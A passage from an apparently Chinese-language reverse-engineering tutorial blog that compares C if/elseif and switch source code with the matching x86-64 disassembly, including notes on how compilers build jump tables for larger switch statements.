class="hljs-string">&quot;else\r\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;haha\r\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> nVar_4;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> var_4           = dword ptr <span class="hljs-number">-4</span>   <span class="hljs-comment">//</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h  <span class="hljs-comment">//argc</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h  <span class="hljs-comment">//argv</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 mov     [rbp+var_4], <span class="hljs-number">5</span>   <span class="hljs-comment">//var_a=5</span><br>.text:<span class="hljs-number">000000000040156B</span>                 lea     rax, [rbp+var_4]  <br>.text:<span class="hljs-number">000000000040156F</span>                 mov     rdx, rax<br>.text:<span class="hljs-number">0000000000401572</span>                 lea     rcx, Format     ; <span class="hljs-string">&quot;%d&quot;</span><br>.text:<span class="hljs-number">0000000000401579</span>                 call    <span class="hljs-built_in">scanf</span><br>.text:<span class="hljs-number">000000000040157</span>E                 cmp     [rbp+arg_0], <span class="hljs-number">0</span>  <span class="hljs-comment">//argc -0  //if (var_a==0)&#123; pintf(&quot;argc == 0\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jnz     <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;argc == 0\r&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015DA  <span class="hljs-comment">//直接结束</span><br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span>  <span class="hljs-comment">//这里可以看到是直接无条件跳转到这里 结束指向同一个 地址loc_4015DA 由于loc_4015BE后才是统一结束判断地址 因为 那里是对应的else语句 因此可以判断使用了 ifelif语句结构</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">32</span>↑j  <span class="hljs-comment">//if</span><br>.text:<span class="hljs-number">0000000000401592</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span>  <span class="hljs-comment">//elif (var_a==1)&#123; pintf(&quot;argc == 1\r&quot;);&#125;</span><br>.text:<span class="hljs-number">0000000000401596</span>                 jnz     <span class="hljs-keyword">short</span> h<br>.text:<span class="hljs-number">0000000000401598</span>                 lea     rcx, aArgc1     ; <span class="hljs-string">&quot;argc == 1\r&quot;</span><br>.text:<span class="hljs-number">000000000040159F</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>A4                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>A6 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A6<br>.text:<span class="hljs-number">00000000004015</span>A6 loc_4015A6:                             ; CODE XREF: main+<span class="hljs-number">46</span>↑j <span class="hljs-comment">//elif (var_a==2)&#123; pintf(&quot;argc == 2\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">00000000004015</span>AA                 jnz     <span class="hljs-keyword">short</span> loc_4015BA<br>.text:<span class="hljs-number">00000000004015</span>AC                 lea     rcx, aArgc2     ; <span class="hljs-string">&quot;argc == 2\r&quot;</span><br>.text:<span class="hljs-number">00000000004015B</span>3                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015B</span>8                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015B</span>A ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015B</span>A<br>.text:<span class="hljs-number">00000000004015B</span>A loc_4015BA:                             ; CODE XREF: main+<span class="hljs-number">5</span>A↑j <span class="hljs-comment">//elif (var_a==3)&#123; pintf(&quot;argc == 3\r&quot;);&#125;</span><br>.text:<span class="hljs-number">00000000004015B</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004015B</span>E                 jnz     <span class="hljs-keyword">short</span> loc_4015CE<br>.text:<span class="hljs-number">00000000004015</span>C0                 lea     rcx, aArgc3     ; <span class="hljs-string">&quot;argc == 3\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>C7                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>CC                 jmp     <span class="hljs-keyword">short</span> loc_4015DA<br>.text:<span class="hljs-number">00000000004015</span>CE ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>CE<br>.text:<span class="hljs-number">00000000004015</span>CE loc_4015CE:                             ; CODE XREF: main+<span class="hljs-number">6</span>E↑j<br>.text:<span class="hljs-number">00000000004015</span>CE                 lea     rcx, aElse      ; <span class="hljs-string">&quot;else\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>D5                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>DA<br>.text:<span class="hljs-number">00000000004015</span>DA loc_4015DA:                             ; CODE XREF: main+<span class="hljs-number">40</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>DA                                         ; main+<span class="hljs-number">54</span>↑j ...<br>.text:<span class="hljs-number">00000000004015</span>DA                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015E1</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015E6</span>                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>ED                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>2                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">00000000004015F</span>9                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015F</span>E                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401605</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040160</span>A                 lea     rcx, aHaha      ; <span class="hljs-string">&quot;haha\r&quot;</span><br>.text:<span class="hljs-number">0000000000401611</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401616</span>                 mov     eax, [rbp+var_4]<br>.text:<span class="hljs-number">0000000000401619</span>                 add     rsp, <span class="hljs-number">30</span>h<br>.text:<span class="hljs-number">000000000040161</span>D                 pop     rbp<br>.text:<span class="hljs-number">000000000040161</span>E                 retn<br>.text:<span class="hljs-number">000000000040161</span>E main            endp<br></code></pre></td></tr></table></figure><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>特点：</p><p>​    特点1: &#x2F;&#x2F; 注意，和elseif不同，内容中没有break的话，编译不会自动加入break（就是jmp 结尾） </p><p>​    特点2: &#x2F;&#x2F; 内容连着写，这是为了符合C语言的语法：case中不写break，会顺着执行下一条case</p><p>​    特点3:&#x2F;&#x2F; 跳转表是从0开始的，因此记录最小值，switch的判断中会让元素减去最小值，再查表。减去最小值的好处：如果输入小于最小值，那么这个输入再减去最小值就会变成负数， 而比较时使用ja，也就是用无符号数判断，那么这个负数就会变成一个很大的数，同样会跳转</p><h4 id="ezswitch小于3"><a href="#ezswitch小于3" class="headerlink" title="ezswitch小于3"></a>ezswitch小于3</h4><p>switch</p><p>当case情况小于等于3时，ifelse和switch并没有什么区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(argc)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 0\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 1\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;case 2\n&quot;</span>);<br><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HelloWorld\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应反汇编</p><p>&#x2F;&#x2F;下面这里编辑器做了优化 减少了一次跳转 0 1 2  &#x3D;&gt; 1 2 0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">0000000000401550</span> ; <span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function">.text:0000000000401550                 <span class="hljs-keyword">public</span> main</span><br><span class="hljs-function">.text:0000000000401550 main            proc near               </span>; CODE XREF: __tmainCRTStartup+<span class="hljs-number">242</span>↑p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h<br>.text:<span class="hljs-number">0000000000401550</span> arg_8           = qword ptr  <span class="hljs-number">18</span>h<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp<br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx<br>.text:<span class="hljs-number">000000000040155B</span>                 mov     [rbp+arg_8], rdx<br>.text:<span class="hljs-number">000000000040155F</span>                 call    __main<br>.text:<span class="hljs-number">0000000000401564</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000401568</span>                 jz      <span class="hljs-keyword">short</span> loc_401584<br>.text:<span class="hljs-number">000000000040156</span>A                 cmp     [rbp+arg_0], <span class="hljs-number">2</span><br>.text:<span class="hljs-number">000000000040156</span>E                 jz      <span class="hljs-keyword">short</span> loc_401592<br>.text:<span class="hljs-number">0000000000401570</span>                 cmp     [rbp+arg_0], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">0000000000401574</span>                 jnz     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401576</span>                 lea     rcx, Buffer     ; <span class="hljs-string">&quot;case 0&quot;</span><br>.text:<span class="hljs-number">000000000040157</span>D                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401582</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401584</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401584</span><br>.text:<span class="hljs-number">0000000000401584</span> loc_401584:                             ; CODE XREF: main+<span class="hljs-number">18</span>↑j<br>.text:<span class="hljs-number">0000000000401584</span>                 lea     rcx, aCase1     ; <span class="hljs-string">&quot;case 1&quot;</span><br>.text:<span class="hljs-number">000000000040158B</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">0000000000401590</span>                 jmp     <span class="hljs-keyword">short</span> loc_40159F<br>.text:<span class="hljs-number">0000000000401592</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401592</span><br>.text:<span class="hljs-number">0000000000401592</span> loc_401592:                             ; CODE XREF: main+<span class="hljs-number">1</span>E↑j<br>.text:<span class="hljs-number">0000000000401592</span>                 lea     rcx, aCase2     ; <span class="hljs-string">&quot;case 2&quot;</span><br>.text:<span class="hljs-number">0000000000401599</span>                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">000000000040159</span>E                 nop<br>.text:<span class="hljs-number">000000000040159F</span><br>.text:<span class="hljs-number">000000000040159F</span> loc_40159F:                             ; CODE XREF: main+<span class="hljs-number">24</span>↑j<br>.text:<span class="hljs-number">000000000040159F</span>                                         ; main+<span class="hljs-number">32</span>↑j ...<br>.text:<span class="hljs-number">000000000040159F</span>                 lea     rcx, aHelloworld ; <span class="hljs-string">&quot;HelloWorld&quot;</span><br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">puts</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 mov     eax, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">00000000004015B</span>0                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>4                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>5                 retn<br>.text:<span class="hljs-number">00000000004015B</span>5 main            endp<br></code></pre></td></tr></table></figure><h4 id="switch-分支大于4"><a href="#switch-分支大于4" class="headerlink" title="switch 分支大于4"></a>switch 分支大于4</h4><p>注意switch分支大于4之后就有跳转表</p><p>详解在switch7那里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myFunction</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span>(x)<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    myFunction(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的反汇编代码  (这里仅放function的部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"> myFunction      proc near               ; CODE XREF: main+<span class="hljs-number">12</span>↓p<br>.text:<span class="hljs-number">0000000000401550</span>                                         ; DATA XREF: .pdata:<span class="hljs-number">000000000040506</span>C↓o<br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span> arg_0           = dword ptr  <span class="hljs-number">10</span>h   <span class="hljs-comment">//传入参数</span><br>.text:<span class="hljs-number">0000000000401550</span><br>.text:<span class="hljs-number">0000000000401550</span>                 push    rbp  <br>.text:<span class="hljs-number">0000000000401551</span>                 mov     rbp, rsp<br>.text:<span class="hljs-number">0000000000401554</span>                 sub     rsp, <span class="hljs-number">20</span>h                 <span class="hljs-comment">//开辟空间 </span><br>.text:<span class="hljs-number">0000000000401558</span>                 mov     [rbp+arg_0], ecx  <span class="hljs-comment">//把 传入的参数 给 函数体内的局部变量 </span><br>.text:<span class="hljs-number">000000000040155B</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>   <span class="hljs-comment">// if(x==2)</span><br>.text:<span class="hljs-number">000000000040155F</span>                 jz      <span class="hljs-keyword">short</span> loc_401589<br>.text:<span class="hljs-number">0000000000401561</span>                 cmp     [rbp+arg_0], <span class="hljs-number">2</span>  <span class="hljs-comment">//if(x&gt;2)</span><br>.text:<span class="hljs-number">0000000000401565</span>                 jg      <span class="hljs-keyword">short</span> loc_40156F<br>.text:<span class="hljs-number">0000000000401567</span>                 cmp     [rbp+arg_0], <span class="hljs-number">1</span> <span class="hljs-comment">//if(x==1)</span><br>.text:<span class="hljs-number">000000000040156B</span>                 jz      <span class="hljs-keyword">short</span> loc_40157D  <br>.text:<span class="hljs-number">000000000040156</span>D                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040156F</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040156F</span><br>.text:<span class="hljs-number">000000000040156F</span> loc_40156F:                             ; CODE XREF: myFunction+<span class="hljs-number">15</span>↑j<br>.text:<span class="hljs-number">000000000040156F</span>                 cmp     [rbp+arg_0], <span class="hljs-number">3</span>   <br>.text:<span class="hljs-number">0000000000401573</span>                 jz      <span class="hljs-keyword">short</span> loc_401595<br>.text:<span class="hljs-number">0000000000401575</span>                 cmp     [rbp+arg_0], <span class="hljs-number">4</span><br>.text:<span class="hljs-number">0000000000401579</span>                 jz      <span class="hljs-keyword">short</span> loc_4015A1<br>.text:<span class="hljs-number">000000000040157B</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015AD<br>.text:<span class="hljs-number">000000000040157</span>D ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">000000000040157</span>D<br>.text:<span class="hljs-number">000000000040157</span>D loc_40157D:                             ; CODE XREF: myFunction+<span class="hljs-number">1B</span>↑j<br>.text:<span class="hljs-number">000000000040157</span>D                 mov     ecx, <span class="hljs-number">31</span>h ; <span class="hljs-string">&#x27;1&#x27;</span>  ; Character<br>.text:<span class="hljs-number">0000000000401582</span>                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">//printf(&quot;1&quot;);</span><br>.text:<span class="hljs-number">0000000000401587</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401589</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401589</span><br>.text:<span class="hljs-number">0000000000401589</span> loc_401589:                             ; CODE XREF: myFunction+F↑j<br>.text:<span class="hljs-number">0000000000401589</span>                 mov     ecx, <span class="hljs-number">32</span>h ; <span class="hljs-string">&#x27;2&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040158</span>E                 call    <span class="hljs-built_in">putchar</span>   <span class="hljs-comment">// printf(&quot;2&quot;);</span><br>.text:<span class="hljs-number">0000000000401593</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">0000000000401595</span> ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">0000000000401595</span><br>.text:<span class="hljs-number">0000000000401595</span> loc_401595:                             ; CODE XREF: myFunction+<span class="hljs-number">23</span>↑j<br>.text:<span class="hljs-number">0000000000401595</span>                 mov     ecx, <span class="hljs-number">33</span>h ; <span class="hljs-string">&#x27;3&#x27;</span>  ; Character<br>.text:<span class="hljs-number">000000000040159</span>A                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;3&quot;);</span><br>.text:<span class="hljs-number">000000000040159F</span>                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>A1 ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>A1<br>.text:<span class="hljs-number">00000000004015</span>A1 loc_4015A1:                             ; CODE XREF: myFunction+<span class="hljs-number">29</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>A1                 mov     ecx, <span class="hljs-number">34</span>h ; <span class="hljs-string">&#x27;4&#x27;</span>  ; Character<br>.text:<span class="hljs-number">00000000004015</span>A6                 call    <span class="hljs-built_in">putchar</span>  <span class="hljs-comment">//printf(&quot;4&quot;);</span><br>.text:<span class="hljs-number">00000000004015</span>AB                 jmp     <span class="hljs-keyword">short</span> loc_4015B9<br>.text:<span class="hljs-number">00000000004015</span>AD ; ---------------------------------------------------------------------------<br>.text:<span class="hljs-number">00000000004015</span>AD<br>.text:<span class="hljs-number">00000000004015</span>AD loc_4015AD:                             ; CODE XREF: myFunction+<span class="hljs-number">1</span>D↑j<br>.text:<span class="hljs-number">00000000004015</span>AD                                         ; myFunction+<span class="hljs-number">2B</span>↑j<br>.text:<span class="hljs-number">00000000004015</span>AD                 lea     rcx, Format     ; <span class="hljs-string">&quot;error&quot;</span>  <span class="hljs-comment">//default:error</span><br>.text:<span class="hljs-number">00000000004015B</span>4                 call    <span class="hljs-built_in">printf</span><br>.text:<span class="hljs-number">00000000004015B</span>9<br>.text:<span class="hljs-number">00000000004015B</span>9 loc_4015B9:                             ; CODE XREF: myFunction+<span class="hljs-number">37</span>↑j<br>.text:<span class="hljs-number">00000000004015B</span>9                                         ; myFunction+<span class="hljs-number">43</span>↑j ...<br>.text:<span class="hljs-number">00000000004015B</span>9                 nop<br>.text:<span class="hljs-number">00000000004015B</span>A                 add     rsp, <span class="hljs-number">20</span>h<br>.text:<span class="hljs-number">00000000004015B</span>E                 pop     rbp<br>.text:<span class="hljs-number">00000000004015B</span>F                 retn<br>.text:<span class="hljs-number">00000000004015B</span>F myFunction      endp<br></code></pre></td></tr></table></figure><h4 id="switch-分支大于7"><a href="#switch-分支大于7" class="headerlink" title="switch 分支大于7"></a>switch 分支大于7</h4><p>当switch的分支大于7时</p><p>这是小表存放跳转的索引 即 edx</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202112261422135.png" alt="image-20211226142233001"></p><p>内存会建立跳转表 存放 每个case后的函数体的起始地址</p><p>这里的寻址类似于数组的寻址  address&#x3D;[第一个case的起始地址+4*寄存器(步长)]</p><p><img 